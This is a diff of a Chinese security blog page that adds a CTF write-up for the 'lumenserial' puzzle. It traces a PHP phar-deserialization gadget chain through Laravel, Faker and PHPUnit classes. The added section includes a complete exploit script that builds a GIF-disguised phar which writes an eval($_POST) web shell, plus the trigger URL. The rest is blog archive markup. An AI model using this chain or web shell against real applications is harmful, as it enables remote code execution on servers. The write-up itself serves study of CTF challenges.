@@ -261,12 +261,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,258</span> / Reading time: <span class="post-count">10 min</span></span>
+                        <span>Word count: <span class="post-count">3,244</span> / Reading time: <span class="post-count">15 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/01/09</span>
+                    <span class="post-intro-time">2018/01/23</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -478,14 +478,51 @@ height:50vh;
 <p>注意修改Host，他会拼接<br>（Host不能包含: /等特殊字符）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain: base64后的&lt;?=`ls`;/***</span><br></pre></td></tr></table></figure>
 <p><img src="/code/19.png" alt="9"><br>成功执行<br><img src="/code/20.png" alt="9"><br>final payload<br><code>PD89YGNhdCAnLi4vLi4vLi4vZmxhZ19waHBtYWcxY191cjEnYDsvKioq</code><br><img src="/code/21.png" alt="9"></p>
+<h2 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h2><h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><p>下载源码审计<br>禁用了函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure>
+<p>首先<code>composer install</code><br>关键代码在<code>app/Http/Controllers/EditorController.php</code><br>几个自认为比较关键的地方</p>
+<p>download函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private function download($url)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    $content = file_get_contents($url);</span><br></pre></td></tr></table></figure>
+<p>其中这个url函数是完全可控的<br>既然有<code>file_get_contents</code> 不难想到可以利用phar进行反序列化</p>
+<h3 id="寻找POP链"><a href="#寻找POP链" class="headerlink" title="寻找POP链"></a>寻找POP链</h3><p>想要寻找phar的利用入口，就需要用到<code>__destruct</code>，<code>__call</code>函数对其他函数的调用<br>先全局搜索<code>__destruct</code>,在<code>vendor/illuminate/broadcasting/PendingBroadcast.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进<code>dispatch</code> 方法<br><img src="/code/22.png" alt="9"><br>于是我们可以将<code>$this-&gt;events</code>置为我们想要利用的类，而类没有<code>dispatch</code>方法，从而去调用该类里的<code>__call</code>方法</p>
+<p>那么我们就要把目光投向<code>__call</code>方法，<code>__call</code>方法就很多了<br><img src="/code/23.png" alt="9"></p>
+<h4 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h4><p>在<code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    $i = 0;</span><br><span class="line">    do &#123;</span><br><span class="line">        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br><span class="line">        $i++;</span><br><span class="line">        if ($i &gt; $this-&gt;maxRetries) &#123;</span><br><span class="line">            throw new \OverflowException(sprintf(&apos;Maximum retries of %d reached without finding a valid value&apos;, $this-&gt;maxRetries));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while (!call_user_func($this-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">    return $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$name</code> 参数是要调用的方法名称。<code>$arguments</code> 参数是一个枚举数组，包含着要传递给方法 <code>$name</code> 的参数。<br>所以说这里的<code>$name</code>就为<code>dispatch</code>,不可控<br>在<br><code>$res = call_user_func_array(array($this-&gt;generator, $name), 
+$arguments);</code></p>
+<h4 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h4><p>而这里<code>$this-&gt;generator</code> 为<code>Generator</code>类<br>但是在<code>Generator</code>类 由于找不到<code>dispatch</code>方法，又会去调用<code>Generator</code>类的<code>__call</code>方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时<code>$method</code>是<code>dispatch</code> 不可控<br>format方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即<code>$formatter</code> 是<code>dispatch</code> 可控</p>
+<p>getFormatter方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function getFormatter($formatter)</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        return $this-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>看到，这里return了一个fomatters数组，于是可以控制该数组<br>于是在<code>format</code>的<br><code>return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</code><br>这里<code>$this-&gt;getFormatter($formatter)</code>就为数组，于是可以调用任意类的方法<br>于是让<code>$formatters = array(&quot;$dispatch&quot;=&gt;&quot;array($obj,&quot;getFormatter&quot;)&quot;)</code></p>
+<p>取出的<code>$dispatch</code> 就是 <code>array($obj,&quot;getFormatter&quot;)</code><br>然后 <code>$obj=array(&#39;everything&#39; =&gt; $evilobj)</code><br>这里需要两次调用<code>Generator</code>类，嵌套调用</p>
+<ul>
+<li>第一次：使<code>$dispatch</code>成为一个数组，让其值可控</li>
+<li>第二次：返回任意类，使$res可控</li>
+</ul>
+<p>（这个点饶了一万年。。。）</p>
+<h4 id="利用任意类"><a href="#利用任意类" class="headerlink" title="利用任意类"></a>利用任意类</h4><p>既然$res可控了，即<code>call_user_func($this-&gt;validator, $res)</code><br>第二个参数可控</p>
+<p>在<code>vendor/phpunit/phpunit/src/Framework/MockObject/Stub/ReturnCallback.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">private $callback;</span><br><span class="line"></span><br><span class="line">    public function __construct($callback)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;callback = $callback;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    public function invoke(Invocation $invocation)</span><br><span class="line">    &#123;</span><br><span class="line">        return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>$this-&gt;callback</code>可控，<code>getParameters</code>在接口<br><img src="/code/24.png" alt="9"><br>于是要找继承该接口的类<br>在<br><code>vendor/phpunit/phpunit/src/Framework/MockObject/Invocation/StaticInvocation.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class StaticInvocation implements Invocation, SelfDescribing&#123;</span><br><span class="line">   ...</span><br><span class="line">   public function getParameters(): array</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;parameters;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>于是payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;event = &apos;hu3sky&apos;;</span><br><span class="line">            $this-&gt;events = new \Faker\ValidGenerator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Stub&#123;</span><br><span class="line">    class ReturnCallback&#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;callback = &apos;file_put_contents&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Invocation&#123;</span><br><span class="line">    class StaticInvocation&#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parameters = array(&apos;/var/www/html/upload/b.php&apos;,&apos;&lt;?php @eval($_POST[a]);?&gt;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class ValidGenerator&#123;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $ob1 = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();</span><br><span class="line">            $ob = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();</span><br><span class="line">            $ob2 = new \Faker\Generator(array(&apos;hu3sky&apos; =&gt; $ob));</span><br><span class="line">            $ob3 = new \Faker\Generator(array(&apos;dispatch&apos; =&gt; array($ob2,&apos;getFormatter&apos;)));</span><br><span class="line"></span><br><span class="line">            $this-&gt;validator = array($ob1,&apos;invoke&apos;);</span><br><span class="line">            $this-&gt;generator = $ob3;</span><br><span class="line">            $this-&gt;maxRetries = 1000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        function __construct($format)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters = $format;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    $exp = new Illuminate\Broadcasting\PendingBroadcast();</span><br><span class="line">    print_r(urlencode(serialize($exp)));</span><br><span class="line"></span><br><span class="line">    // phar</span><br><span class="line">    $p = new Phar(&apos;hu3sky.phar&apos;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);</span><br><span class="line">    $p-&gt;setMetadata($exp);</span><br><span class="line">    $p-&gt;addFromString(&apos;1.txt&apos;,&apos;text&apos;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>将hu3sky.phar改名为gif 然后去上传图片，图片返回地址可以在F12里看到<br>然后，利用file_get_contents包含<br><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/e47ef897e343f580c9b59e4b9756074e/201901/23/dd9b81060394e6264c10.gif</code><br>就会生成马<br><img src="/code/25.png" alt="9"></p>
+<h3 id="学习与参考"><a href="#学习与参考" class="headerlink" title="学习与参考"></a>学习与参考</h3><p><a href="https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html</a><br><a href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#lumenserial" target="_blank" rel="noopener">https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#lumenserial</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://yoursite.com">Hu3sky</a>
-            <p>原文链接: <a href="http://yoursite.com/2019/01/09/Code_breaking/">http://yoursite.com/2019/01/09/Code_breaking/</a>
-            <p>发表日期: <a href="http://yoursite.com/2019/01/09/Code_breaking/">January 9th 2019, 10:47:10 am</a>
+            <p>原文链接: <a href="http://yoursite.com/2018/01/23/Code_breaking/">http://yoursite.com/2018/01/23/Code_breaking/</a>
+            <p>发表日期: <a href="http://yoursite.com/2018/01/23/Code_breaking/">January 23rd 2018, 12:04:00 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -494,17 +531,12 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/01/11/PHPCMS2008/" title= PHPCMS2008_getshell >
-                    <div class="nextTitle">PHPCMS2008_getshell</div>
+                <a href= "/2018/03/15/会员日Pwnhub复现/" title= 会员日Pwnhub题目的复现 >
+                    <div class="nextTitle">会员日Pwnhub题目的复现</div>
                 </a>
             
         </li>
         <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/01/07/35c3部分做题记录/" title= 35C3 CTF 部分解题记录（junior） >
-                    <div class="prevTitle">35C3 CTF 部分解题记录（junior）</div>
-                </a>
             
         </li>
     </ul>
@@ -631,7 +663,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-Breaking-Puzzles"><span class="toc-number">1.</span> <span class="toc-text">Code-Breaking Puzzles</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-function"><span class="toc-number">1.1.</span> <span class="toc-text">easy - function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pcrewaf"><span class="toc-number">1.2.</span> <span class="toc-text">easy - pcrewaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#如何防御"><span class="toc-number">1.2.1.</span> <span class="toc-text">如何防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-phplimit"><span class="toc-number">1.3.</span> <span class="toc-text">easy - phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag-name"><span class="toc-number">1.3.1.</span> <span class="toc-text">getflag_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-flag"><span class="toc-number">1.3.2.</span> <span class="toc-text">get_flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-nodechr"><span class="toc-number">1.4.</span> <span class="toc-text">easy - nodechr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目源码分析"><span class="toc-number">1.4.1.</span> <span class="toc-text">题目源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路"><span class="toc-number">1.4.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-phpmagic"><span class="toc-number">1.5.</span> <span class="toc-text">easy - phpmagic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码分析"><span class="toc-number">1.5.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测利用点"><span class="toc-number">1.5.2.</span> <span class="toc-text">猜测利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后缀绕过"><span class="toc-number">1.5.3.</span> <span class="toc-text">后缀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件写入"><span class="toc-number">1.5.4.</span> <span class="toc-text">文件写入</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-Breaking-Puzzles"><span class="toc-number">1.</span> <span class="toc-text">Code-Breaking Puzzles</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-function"><span class="toc-number">1.1.</span> <span class="toc-text">easy - function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pcrewaf"><span class="toc-number">1.2.</span> <span class="toc-text">easy - pcrewaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#如何防御"><span class="toc-number">1.2.1.</span> <span class="toc-text">如何防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-phplimit"><span class="toc-number">1.3.</span> <span class="toc-text">easy - phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag-name"><span class="toc-number">1.3.1.</span> <span class="toc-text">getflag_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-flag"><span class="toc-number">1.3.2.</span> <span class="toc-text">get_flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-nodechr"><span class="toc-number">1.4.</span> <span class="toc-text">easy - nodechr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目源码分析"><span class="toc-number">1.4.1.</span> <span class="toc-text">题目源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路"><span class="toc-number">1.4.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-phpmagic"><span class="toc-number">1.5.</span> <span class="toc-text">easy - phpmagic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码分析"><span class="toc-number">1.5.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测利用点"><span class="toc-number">1.5.2.</span> <span class="toc-text">猜测利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后缀绕过"><span class="toc-number">1.5.3.</span> <span class="toc-text">后缀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件写入"><span class="toc-number">1.5.4.</span> <span class="toc-text">文件写入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lumenserial"><span class="toc-number">1.6.</span> <span class="toc-text">lumenserial</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#初步判断"><span class="toc-number">1.6.1.</span> <span class="toc-text">初步判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找POP链"><span class="toc-number">1.6.2.</span> <span class="toc-text">寻找POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ValidGenerator"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">ValidGenerator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Generator"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">Generator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用任意类"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">利用任意类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#学习与参考"><span class="toc-number">1.6.3.</span> <span class="toc-text">学习与参考</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -644,6 +676,56 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1421,6 +1503,34 @@ top:50vh;
     
     
     
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
     
@@ -1594,6 +1704,43 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/01/21/0ctf-ezdoor/" >0ctf-ezdoor</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/scrapy笔记/" >Scrapy笔记</a>
         </li>
@@ -1606,39 +1753,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2018/03/23/VehicleWorkshop/" >VehicleWorkshop上传漏洞本地复现</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2018/03/16/redtiger level4/" >Redtiger题目</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/04/18/Broad Crawls~Benchmarking/" >[Untitled Post]</a>
         </li>
     
     
@@ -1666,7 +1780,21 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/01/09/Code_breaking/" >Code-Breaking Puzzles</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/06/29/The game of bob/" >Bob 1.0.1</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/04/18/Broad Crawls~Benchmarking/" >[Untitled Post]</a>
         </li>
     
     
@@ -1689,54 +1817,36 @@ top:50vh;
     
         </ul>
     
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/06/29/The game of bob/" >Bob 1.0.1</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2018/03/16/redtiger level4/" >Redtiger题目</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/会员日Pwnhub复现/" >会员日Pwnhub题目的复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href= "/2018/01/23/Code_breaking/" >Code-Breaking Puzzles</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
         </li>
     
     
@@ -1751,34 +1861,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/10/06/destoon/" >destoon前台getshell复现</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/01/21/0ctf-ezdoor/" >0ctf-ezdoor</a>
         </li>
     
     </div>
@@ -1819,45 +1901,45 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
-    
-        <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
+        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
     
         <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
         <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
-        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
